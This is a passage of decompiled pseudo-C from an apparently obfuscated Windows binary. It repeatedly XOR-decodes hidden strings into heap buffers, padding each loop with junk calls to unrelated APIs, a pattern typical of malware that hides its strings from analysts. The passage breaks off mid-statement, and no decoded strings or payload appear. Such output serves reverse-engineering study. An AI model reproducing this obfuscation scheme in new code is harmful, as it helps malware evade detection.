fcn.00406483();\n    var_24h._0_1_ = 0x1a;\n    var_24h._1_1_ = 0x37;\n    var_24h._2_1_ = 0x37;\n    var_24h._3_1_ = 4;\n    var_20h._0_1_ = 2;\n    var_20h._1_1_ = 0x32;\n    var_20h._2_1_ = 0x20;\n    var_20h._3_1_ = 0x3c;\n    var_1ch._0_1_ = 0x1f;\n    var_1ch._1_1_ = 0x24;\n    var_1ch._2_1_ = 2;\n    var_1ch._3_1_ = 0x39;\n    var_18h[0] = 0x26;\n    var_18h[1] = 0x27;\n    var_16h._0_1_ = 0x14;\n    var_16h._1_1_ = 0x11;\n    var_16h._2_1_ = 0x31;\n    var_16h._3_1_ = 0x28;\n    var_12h._0_1_ = 0x20;\n    var_12h._1_1_ = 0x24;\n    var_12h._2_1_ = 0x13;\n    var_12h._3_1_ = 9;\n    var_eh._0_1_ = 4;\n    var_eh._1_1_ = 0x3d;\n    var_eh._2_1_ = 0x2c;\n    var_eh._3_1_ = 0x52;\n    stack0xfffffff4 = 0x657a5249;\n    var_4h._0_2_ = 0x5a61;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_2ch = &var_24h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar9 != 0x5d72be) {\n            *(iVar8 + iVar7) = *(&var_ah + iVar8 % var_34h + 2) ^ (iVar8 + iVar7)[&var_24h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1a);\n    fcn.00406483();\n    var_18h[0] = 0x1e;\n    var_18h[1] = 0x23;\n    var_16h._0_1_ = 0x26;\n    var_16h._1_1_ = 0xf;\n    var_16h._2_1_ = 0x1b;\n    var_16h._3_1_ = 0x1d;\n    var_12h._0_1_ = 0x34;\n    var_12h._1_1_ = 0x1b;\n    var_12h._2_1_ = 0x1a;\n    var_12h._3_1_ = 0x10;\n    var_eh._0_1_ = 0x21;\n    var_eh._1_1_ = 0x23;\n    var_eh._2_1_ = 0x15;\n    var_eh._3_1_ = 9;\n    var_ah._0_1_ = 0x79;\n    var_60h = 0x6c72464d;\n    var_5ch._0_1_ = 0x79;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_2ch = var_18h + -iVar8;\n    do {\n        iVar10 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar10 != 0x55bcca) {\n            *(iVar9 + iVar8) = *(&var_60h + iVar9 % var_38h) ^ (iVar9 + iVar8)[var_18h + -iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0xf);\n    fcn.00406483();\n    var_1ch._0_1_ = 0x1b;\n    var_1ch._1_1_ = 0x34;\n    var_1ch._2_1_ = 0x17;\n    var_1ch._3_1_ = 4;\n    var_18h[0] = 0x14;\n    var_18h[1] = 2;\n    var_16h._0_1_ = 0x3a;\n    var_16h._1_1_ = 0x38;\n    var_16h._2_1_ = 0x30;\n    var_16h._3_1_ = 0x18;\n    var_12h._0_1_ = 0x27;\n    var_12h._1_1_ = 5;\n    var_12h._2_1_ = 0x21;\n    var_12h._3_1_ = 0x27;\n    var_eh._0_1_ = 0x2d;\n    var_eh._1_1_ = 0xd;\n    var_eh._2_1_ = 0x12;\n    var_eh._3_1_ = 0x10;\n    var_ah._0_1_ = 0x2d;\n    var_ah._1_1_ = 0x51;\n    stack0xfffffff4 = 0x61445148;\n    var_4h._0_2_ = 0x7777;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar10 = 0;\n    var_60h = iVar9;\n    var_2ch = var_18h + (-4 - iVar9);\n    do {\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar11 != 0xa6a0af) {\n            *(iVar10 + iVar9) = *(&var_ah + iVar10 % var_34h + 2) ^ (iVar10 + iVar9)[var_18h + (-4 - iVar9)];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x14);\n    fcn.00406483();\n    var_24h._0_1_ = 0x2a;\n    var_24h._1_1_ = 0x26;\n    var_24h._2_1_ = 0x32;\n    var_24h._3_1_ = 0x54;\n    var_20h._0_1_ = 0x2a;\n    var_20h._1_1_ = 0x1c;\n    var_20h._2_1_ = 0xc;\n    var_20h._3_1_ = 0x11;\n    var_1ch._0_1_ = 0x5b;\n    var_1ch._1_1_ = 0x24;\n    var_1ch._2_1_ = 0xb;\n    var_1ch._3_1_ = 0x30;\n    var_18h[0] = 0xe;\n    var_18h[1] = 0x5c;\n    var_16h._0_1_ = 0x31;\n    var_16h._1_1_ = 0x29;\n    var_16h._2_1_ = 0x31;\n    var_16h._3_1_ = 0xf;\n    var_12h._0_1_ = 0x43;\n    var_12h._1_1_ = 0x28;\n    var_12h._2_1_ = 0x15;\n    var_12h._3_1_ = 0x26;\n    var_eh._0_1_ = 1;\n    var_eh._1_1_ = 0x50;\n    var_eh._2_1_ = 0x41;\n    var_58h = 0x35664379;\n    var_54h._0_1_ = 0x41;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar10 = 0;\n    var_2ch = &var_24h - iVar9;\n    do {\n        iVar11 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar11 != 0x6c9553) {\n            *(iVar10 + iVar9) = *(&var_58h + iVar10 % var_38h) ^ (iVar10 + iVar9)[&var_24h - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x19);\n    fcn.00406483();\n    var_20h._0_1_ = 0x3a;\n    var_20h._1_1_ = 0x33;\n    var_20h._2_1_ = 0x78;\n    var_20h._3_1_ = 7;\n    var_1ch._0_1_ = 0x55;\n    var_1ch._1_1_ = 0x23;\n    var_1ch._2_1_ = 0x2d;\n    var_1ch._3_1_ = 0x24;\n    var_18h[0] = 0x5d;\n    var_18h[1] = 0x1e;\n    var_16h._0_1_ = 0x51;\n    var_16h._1_1_ = 0x35;\n    var_16h._2_1_ = 0x39;\n    var_16h._3_1_ = 0x24;\n    var_12h._0_1_ = 0x5d;\n    var_12h._1_1_ = 0x1e;\n    var_12h._2_1_ = 0x5d;\n    var_12h._3_1_ = 0x2b;\n    var_eh._0_1_ = 0xc;\n    var_eh._1_1_ = 0x31;\n    var_eh._2_1_ = 0x51;\n    var_eh._3_1_ = 0x68;\n    stack0xfffffff4 = 0x68345669;\n    var_4h._0_2_ = 0x4734;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_58h = iVar10;\n    var_2ch = &var_20h - iVar10;\n    do {\n        iVar12 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar12 != 0x1da828) {\n            *(iVar11 + iVar10) = *(&var_ah + iVar11 % var_34h + 2) ^ (iVar11 + iVar10)[&var_20h - iVar10];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x16);\n    fcn.00406483();\n    var_24h._0_1_ = 0x37;\n    var_24h._1_1_ = 2;\n    var_24h._2_1_ = 0x12;\n    var_24h._3_1_ = 0;\n    var_20h._0_1_ = 10;\n    var_20h._1_1_ = 0x10;\n    var_20h._2_1_ = 2;\n    var_20h._3_1_ = 0x2c;\n    var_1ch._0_1_ = 0x29;\n    var_1ch._1_1_ = 0xb;\n    var_1ch._2_1_ = 0xb;\n    var_1ch._3_1_ = 1;\n    var_18h[0] = 0x28;\n    var_18h[1] = 0x15;\n    var_16h._0_1_ = 0x1c;\n    var_16h._1_1_ = 0x34;\n    var_16h._2_1_ = 0x15;\n    var_16h._3_1_ = 0x28;\n    var_12h._0_1_ = 0xf;\n    var_12h._1_1_ = 0x10;\n    var_12h._2_1_ = 8;\n    var_12h._3_1_ = 2;\n    var_eh._0_1_ = 0x26;\n    var_eh._1_1_ = 0x1c;\n    var_eh._2_1_ = 0x79;\n    var_88h = 0x79416764;\n    var_84h._0_1_ = 0x79;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_2ch = &var_24h - iVar10;\n    do {\n        iVar12 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar12 != 0x815bc3) {\n            *(iVar11 + iVar10) = *(&var_88h + iVar11 % var_38h) ^ (iVar11 + iVar10)[&var_24h - iVar10];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x19);\n    fcn.00406483();\n    var_20h._0_1_ = 0x1a;\n    var_20h._1_1_ = 2;\n    var_20h._2_1_ = 0x67;\n    var_20h._3_1_ = 0x2a;\n    var_1ch._0_1_ = 0x3a;\n    var_1ch._1_1_ = 0x2e;\n    var_1ch._2_1_ = 0x2c;\n    var_1ch._3_1_ = 10;\n    var_18h[0] = 0x40;\n    var_18h[1] = 0x3a;\n    var_16h._0_1_ = 0x24;\n    var_16h._1_1_ = 0x3f;\n    var_16h._2_1_ = 0x19;\n    var_16h._3_1_ = 0x15;\n    var_12h._0_1_ = 0x5d;\n    var_12h._1_1_ = 0x25;\n    var_12h._2_1_ = 0x20;\n    var_12h._3_1_ = 0x36;\n    var_eh._0_1_ = 0x2c;\n    var_eh._1_1_ = 0;\n    var_eh._2_1_ = 0x51;\n    var_eh._3_1_ = 0x53;\n    stack0xfffffff4 = 0x53346749;\n    var_4h._0_2_ = 0x5a49;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_88h = iVar11;\n    var_2ch = &var_20h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar13 != 0x905bbd) {\n            *(iVar12 + iVar11) = *(&var_ah + iVar12 % var_34h + 2) ^ (iVar12 + iVar11)[&var_20h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x16);\n    fcn.00406483();\n    var_28h = 0x11273727;\n    var_24h._0_1_ = 0x5b;\n    var_24h._1_1_ = 0x12;\n    var_24h._2_1_ = 0x3b;\n    var_24h._3_1_ = 0x1b;\n    var_20h._0_1_ = 6;\n    var_20h._1_1_ = 0x67;\n    var_20h._2_1_ = 0x1d;\n    var_20h._3_1_ = 0x3c;\n    var_1ch._0_1_ = 0x10;\n    var_1ch._1_1_ = 0xf;\n    var_1ch._2_1_ = 0x51;\n    var_1ch._3_1_ = 0x24;\n    var_18h[0] = 0x20;\n    var_18h[1] = 0x18;\n    var_16h._0_1_ = 0;\n    var_16h._1_1_ = 0x51;\n    var_16h._2_1_ = 7;\n    var_16h._3_1_ = 0x21;\n    var_12h._0_1_ = 0x27;\n    var_12h._1_1_ = 0x11;\n    var_12h._2_1_ = 0x5d;\n    var_12h._3_1_ = 2;\n    var_eh._0_1_ = 0x3b;\n    var_eh._1_1_ = 0x1b;\n    var_eh._3_1_ = 0x53;\n    var_ah._0_1_ = 0x11;\n    var_ah._1_1_ = 0x52;\n    var_80h = 0x63775274;\n    var_7ch._0_1_ = 0x34;\n    var_eh._2_1_ = var_20h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar12 = 0;\n    var_2ch = &var_28h - iVar11;\n    do {\n        iVar13 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar13 != 0xfac116) {\n            *(iVar12 + iVar11) = *(&var_80h + iVar12 % var_38h) ^ (iVar12 + iVar11)[&var_28h - iVar11];\n        }\n        iVar12 = iVar12 + 1;\n    } while (iVar12 < 0x20);\n    fcn.00406483();\n    var_28h = 0x1e3a0b22;\n    var_24h._0_1_ = 0x2e;\n    var_24h._1_1_ = 2;\n    var_24h._2_1_ = 0x14;\n    var_24h._3_1_ = 0xf;\n    var_20h._0_1_ = 0;\n    var_20h._1_1_ = 0x15;\n    var_20h._2_1_ = 0xf;\n    var_20h._3_1_ = 0x11;\n    var_1ch._0_1_ = 2;\n    var_1ch._1_1_ = 0xb;\n    var_1ch._2_1_ = 0x23;\n    var_1ch._3_1_ = 2;\n    var_18h[0] = 0x24;\n    var_18h[1] = 0x1f;\n    var_16h._0_1_ = 3;\n    var_16h._1_1_ = 7;\n    var_16h._2_1_ = 7;\n    var_16h._3_1_ = 9;\n    var_12h._0_1_ = 0x1d;\n    var_12h._1_1_ = 2;\n    var_12h._2_1_ = 0x18;\n    var_12h._3_1_ = 0x18;\n    var_eh._0_1_ = 0x1a;\n    var_eh._1_1_ = 0x1c;\n    var_eh._2_1_ = 0x28;\n    var_eh._3_1_ = 0x17;\n    var_ah._0_1_ = 0x14;\n    var_ah._1_1_ = 0x6e;\n    stack0xfffffff4 = 0x70736e71;\n    var_4h._0_2_ = 0x704d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar13 = 0;\n    var_80h = iVar12;\n    var_2ch = &var_28h - iVar12;\n    do {\n        iVar14 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar14 != 0xd8a9c7) {\n            *(iVar13 + iVar12) = *(&var_ah + iVar13 % var_34h + 2) ^ (iVar13 + iVar12)[&var_28h - iVar12];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0x20);\n    fcn.00406483();\n    var_24h._0_1_ = 0x3e;\n    var_24h._1_1_ = 0x5d;\n    var_24h._2_1_ = 0x20;\n    var_24h._3_1_ = 0x1e;\n    var_20h._0_1_ = 0x52;\n    var_20h._1_1_ = 0x37;\n    var_20h._2_1_ = 0x19;\n    var_20h._3_1_ = 0x5d;\n    var_1ch._0_1_ = 0x33;\n    var_1ch._1_1_ = 0xd;\n    var_1ch._2_1_ = 0x50;\n    var_1ch._3_1_ = 0x33;\n    var_18h[0] = 0xb;\n    var_18h[1] = 0x51;\n    var_16h._0_1_ = 0xf;\n    var_16h._1_1_ = 9;\n    var_16h._2_1_ = 0x67;\n    var_16h._3_1_ = 0x24;\n    var_12h._0_1_ = 4;\n    var_12h._1_1_ = 0x4e;\n    var_12h._2_1_ = 10;\n    var_12h._3_1_ = 0;\n    var_eh._0_1_ = 0x52;\n    var_eh._1_1_ = 0x31;\n    var_eh._2_1_ = 8;\n    var_eh._3_1_ = 0x38;\n    stack0xfffffff4 = 0x6c63386d;\n    var_4h._0_2_ = 0x5637;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar13 = 0;\n    var_2ch = &var_24h - iVar12;\n    do {\n        iVar14 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar14 != 0x5c401a) {\n            *(iVar13 + iVar12) = *(&var_ah + iVar13 % var_34h + 2) ^ (iVar13 + iVar12)[&var_24h - iVar12];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0x1a);\n    fcn.00406483();\n    var_24h._0_1_ = 0x3f;\n    var_24h._1_1_ = 0x5c;\n    var_24h._2_1_ = 1;\n    var_24h._3_1_ = 0x1a;\n    var_20h._0_1_ = 0x32;\n    var_20h._1_1_ = 0x2b;\n    var_20h._2_1_ = 0x18;\n    var_20h._3_1_ = 0x5c;\n    var_1ch._0_1_ = 0x12;\n    var_1ch._1_1_ = 0xd;\n    var_1ch._2_1_ = 0x25;\n    var_1ch._3_1_ = 0x27;\n    var_18h[0] = 0xd;\n    var_18h[1] = 0x57;\n    var_16h._0_1_ = 0x27;\n    var_16h._1_1_ = 6;\n    var_16h._2_1_ = 0x23;\n    var_16h._3_1_ = 0x1a;\n    var_12h._0_1_ = 0x1e;\n    var_12h._1_1_ = 0x50;\n    var_12h._2_1_ = 0x34;\n    var_12h._3_1_ = 1;\n    var_eh._0_1_ = 0x3b;\n    var_eh._1_1_ = 0x2f;\n    var_eh._2_1_ = 0xb;\n    var_eh._3_1_ = 0x5c;\n    var_ah._0_1_ = 0x42;\n    stack0xfffffff4 = 0x6842396c;\n    var_4h._0_2_ = 0x4a57;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar14 = 0;\n    var_2ch = &var_24h - iVar13;\n    do {\n        iVar15 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar15 != 0x3e0136) {\n            *(iVar14 + iVar13) = *(&var_ah + iVar14 % var_34h + 2) ^ (iVar14 + iVar13)[&var_24h - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x1b);\n    fcn.00406483();\n    var_1ch._0_1_ = 0x3b;\n    var_1ch._1_1_ = 9;\n    var_1ch._2_1_ = 0x2f;\n    var_1ch._3_1_ = 0x31;\n    var_18h[0] = 0x55;\n    var_18h[1] = 3;\n    var_16h._0_1_ = 0x19;\n    var_16h._1_1_ = 0x1d;\n    var_16h._2_1_ = 0;\n    var_16h._3_1_ = 0x44;\n    var_12h._0_1_ = 1;\n    var_12h._1_1_ = 0x1a;\n    var_12h._2_1_ = 4;\n    var_12h._3_1_ = 0x3c;\n    var_eh._0_1_ = 0x53;\n    var_eh._1_1_ = 0xf;\n    var_eh._2_1_ = 9;\n    var_eh._3_1_ = 0x6d;\n    var_78h = 0x506d6c68;\n    var_74h._0_1_ = 0x36;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_2ch = var_18h + (-4 - iVar14);\n    do {\n        iVar16 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar16 != 0x9f5ab) {\n            *(iVar15 + iVar14) = *(&var_78h + iVar15 % var_38h) ^ (iVar15 + iVar14)[var_18h + (-4 - iVar14)];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x12);\n    fcn.00406483();\n    var_1ch._0_1_ = 0x23;\n    var_1ch._1_1_ = 0x26;\n    var_1ch._2_1_ = 0x2a;\n    var_1ch._3_1_ = 1;\n    var_18h[0] = 0x37;\n    var_18h[1] = 0x41;\n    var_16h._0_1_ = 0x1f;\n    var_16h._1_1_ = 0x31;\n    var_16h._2_1_ = 0x1d;\n    var_16h._3_1_ = 0x34;\n    var_12h._0_1_ = 0x36;\n    var_12h._1_1_ = 0x5c;\n    var_12h._2_1_ = 6;\n    var_12h._3_1_ = 0x2a;\n    var_eh._0_1_ = 0x14;\n    var_eh._1_1_ = 1;\n    var_eh._2_1_ = 0x23;\n    var_eh._3_1_ = 0x50;\n    var_ah._0_1_ = 0x70;\n    stack0xfffffff4 = 0x64784370;\n    var_4h._0_2_ = 0x3544;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_78h = iVar15;\n    var_2ch = var_18h + (-4 - iVar15);\n    do {\n        iVar17 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar17 != 0xfcb52a) {\n            *(iVar16 + iVar15) = *(&var_ah + iVar16 % var_34h + 2) ^ (iVar16 + iVar15)[var_18h + (-4 - iVar15)];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x13);\n    fcn.00406483();\n    var_1ch._0_1_ = 0x16;\n    var_1ch._1_1_ = 3;\n    var_1ch._2_1_ = 0x3b;\n    var_1ch._3_1_ = 0x3c;\n    var_18h[0] = 0x45;\n    var_18h[1] = 0x3b;\n    var_16h._0_1_ = 0x21;\n    var_16h._1_1_ = 9;\n    var_16h._2_1_ = 0x1f;\n    var_16h._3_1_ = 0x3a;\n    var_12h._0_1_ = 0x60;\n    var_12h._1_1_ = 0x3d;\n    var_12h._2_1_ = 0x2c;\n    var_12h._3_1_ = 0x10;\n    var_eh._0_1_ = 1;\n    var_eh._1_1_ = 0x38;\n    var_eh._2_1_ = 0x55;\n    var_eh._3_1_ = 0x28;\n    var_ah._0_1_ = 0x20;\n    var_ah._1_1_ = 0x66;\n    stack0xfffffff4 = 0x54686645;\n    var_4h._0_2_ = 0x4f30;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_2ch = var_18h + (-4 - iVar15);\n    do {\n        iVar17 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar17 != 0x58f540) {\n            *(iVar16 + iVar15) = *(&var_ah + iVar16 % var_34h + 2) ^ (iVar16 + iVar15)[var_18h + (-4 - iVar15)];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x14);\n    fcn.00406483();\n    var_1ch._0_1_ = 0x22;\n    var_1ch._1_1_ = 10;\n    var_1ch._2_1_ = 0x27;\n    var_1ch._3_1_ = 0xf;\n    var_18h[0] = 10;\n    var_18h[1] = 0x39;\n    var_16h._0_1_ = 0x16;\n    var_16h._1_1_ = 0x3f;\n    var_16h._2_1_ = 0x11;\n    var_16h._3_1_ = 3;\n    var_12h._0_1_ = 0x1e;\n    var_12h._1_1_ = 0x25;\n    var_12h._2_1_ = 0x1d;\n    var_12h._3_1_ = 10;\n    var_eh._0_1_ = 4;\n    var_eh._1_1_ = 0xf;\n    var_eh._2_1_ = 0x68;\n    stack0xfffffff4 = 0x6a636f71;\n    var_4h._0_2_ = 0x4c68;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar16 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar17 = 0;\n    var_2ch = var_18h + (-4 - iVar16);\n    do {\n        iVar18 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar18 != 0x2c8b32) {\n            *(iVar17 + iVar16) = *(&var_ah + iVar17 % var_34h + 2) ^ (iVar17 + iVar16)[var_18h + (-4 - iVar16)];\n        }\n        iVar17 = iVar17 + 1;\n    } while (iVar17 < 0x11);\n    fcn.00406483();\n    var_1ch._0_1_ = 0x26;\n    var_1ch._1_1_ = 0x55;\n    var_1ch._2_1_ = 0x18;\n    var_1ch._3_1_ = 0x1c;\n    var_18h[0] = 0xb;\n    var_18h[1] = 0x1c;\n    var_16h._0_1_ = 0x44;\n    var_16h._1_1_ = 9;\n    var_16h._2_1_ = 0x1b;\n    var_16h._3_1_ = 6;\n    var_12h._0_1_ = 3;\n    var_12h._1_1_ = 0x59;\n    var_12h._2_1_ = 0x35;\n    var_12h._3_1_ = 0xc;\n    var_eh._0_1_ = 8;\n    var_eh._1_1_ = 0x10;\n    var_eh._2_1_ = 0x30;\n    var_50h = 0x69593075;\n    var_4ch._0_1_ = 0x6f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar18 = 0;\n    var_2ch = var_18h + (-4 - iVar17);\n    do {\n        iVar19 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar19 != 0x870772) {\n            *(iVar18 + iVar17) = *(&var_50h + iVar18 % var_38h) ^ (iVar18 + iVar17)[var_18h + (-4 - iVar17)];\n        }\n        iVar18 = iVar18 + 1;\n    } while (iVar18 < 0x11);\n    fcn.00406483();\n    var_28h = 0xd202803;\n    var_24h._0_1_ = 0x22;\n    var_24h._1_1_ = 0x24;\n    var_24h._2_1_ = 0x28;\n    var_24h._3_1_ = 0x1e;\n    var_20h._0_1_ = 0x31;\n    var_20h._1_1_ = 0x3f;\n    var_20h._2_1_ = 0x26;\n    var_20h._3_1_ = 0x24;\n    var_1ch._0_1_ = 1;\n    var_1ch._1_1_ = 0x1b;\n    var_1ch._2_1_ = 0x3f;\n    var_1ch._3_1_ = 0x3d;\n    var_18h[0] = 0x28;\n    var_18h[1] = 0x1d;\n    var_16h._0_1_ = 0;\n    var_16h._1_1_ = 1;\n    var_16h._2_1_ = 0x22;\n    var_16h._3_1_ = 0x24;\n    var_12h._0_1_ = 5;\n    var_12h._1_1_ = 0x1d;\n    var_12h._2_1_ = 0x3d;\n    var_12h._3_1_ = 0x35;\n    var_eh._0_1_ = 0x2a;\n    var_eh._1_1_ = 0x16;\n    var_eh._2_1_ = 0x74;\n    var_90h = 0x74734d50;\n    var_8ch._0_1_ = 0x51;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_50h = iVar18;\n    var_2ch = &var_28h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar20 != 0xc5b5a6) {\n            *(iVar19 + iVar18) = *(&var_90h + iVar19 % var_38h) ^ (iVar19 + iVar18)[&var_28h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x1d);\n    fcn.00406483();\n    var_20h._0_1_ = 0x1a;\n    var_20h._1_1_ = 0x2b;\n    var_20h._2_1_ = 0x3a;\n    var_20h._3_1_ = 0x3b;\n    var_1ch._0_1_ = 0x11;\n    var_1ch._1_1_ = 8;\n    var_1ch._2_1_ = 0x2e;\n    var_1ch._3_1_ = 0x2b;\n    var_18h[0] = 0x37;\n    var_18h[1] = 0x3c;\n    var_16h._0_1_ = 4;\n    var_16h._1_1_ = 0xf;\n    var_16h._2_1_ = 0x2f;\n    var_16h._3_1_ = 0x37;\n    var_12h._0_1_ = 0x29;\n    var_12h._1_1_ = 0x21;\n    var_12h._2_1_ = 0x19;\n    var_12h._3_1_ = 0x10;\n    var_eh._0_1_ = 0x20;\n    var_eh._1_1_ = 0x22;\n    var_eh._2_1_ = 0x1c;\n    var_eh._3_1_ = 0x34;\n    var_ah._0_1_ = 0x15;\n    var_ah._1_1_ = 0x66;\n    stack0xfffffff4 = 0x53794e49;\n    var_4h._0_2_ = 0x6670;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_90h = iVar18;\n    var_2ch = &var_20h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar20 != 0xea7069) {\n            *(iVar19 + iVar18) = *(&var_ah + iVar19 % var_34h + 2) ^ (iVar19 + iVar18)[&var_20h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x18);\n    fcn.00406483();\n    var_24h._0_1_ = 4;\n    var_24h._1_1_ = 0x2f;\n    var_24h._2_1_ = 0x11;\n    var_24h._3_1_ = 0xf;\n    var_20h._0_1_ = 0x20;\n    var_20h._1_1_ = 0x1b;\n    var_20h._2_1_ = 0x23;\n    var_20h._3_1_ = 0x2f;\n    var_1ch._0_1_ = 0x10;\n    var_1ch._1_1_ = 2;\n    var_1ch._2_1_ = 0x38;\n    var_1ch._3_1_ = 0;\n    var_18h[0] = 0x33;\n    var_18h[1] = 0x25;\n    var_16h._0_1_ = 0x34;\n    var_16h._1_1_ = 4;\n    var_16h._2_1_ = 0x1d;\n    var_16h._3_1_ = 6;\n    var_12h._0_1_ = 0x3e;\n    var_12h._1_1_ = 0x3c;\n    var_12h._2_1_ = 0x2a;\n    var_eh._0_1_ = 0x28;\n    var_eh._1_1_ = 0x13;\n    var_eh._2_1_ = 0x32;\n    var_eh._3_1_ = 0x4a;\n    stack0xfffffff4 = 0x6a434a57;\n    var_4h._0_2_ = 0x744d;\n    var_12h._3_1_ = var_16h._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_2ch = &var_24h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar20 != 0x96a516) {\n            *(iVar19 + iVar18) = *(&var_ah + iVar19 % var_34h + 2) ^ (iVar19 + iVar18)[&var_24h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x1a);\n    fcn.00406483();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_1ch._0_1_ = 0x6a;\n    var_1ch._1_1_ = 0x10;\n    var_1ch._2_1_ = 3;\n    var_1ch._3_1_ = 0x1d;\n    var_18h[0] = 0x1c;\n    var_18h[1] = 1;\n    var_16h._0_1_ = 0x5a;\n    var_16h._1_1_ = 0x1e;\n    var_16h._2_1_ = 6;\n    var_16h._3_1_ = 1;\n    var_12h._0_1_ = 0x11;\n    var_12h._1_1_ = 0x18;\n    var_12h._2_1_ = 0x50;\n    var_12h._3_1_ = 0x19;\n    var_eh._0_1_ = 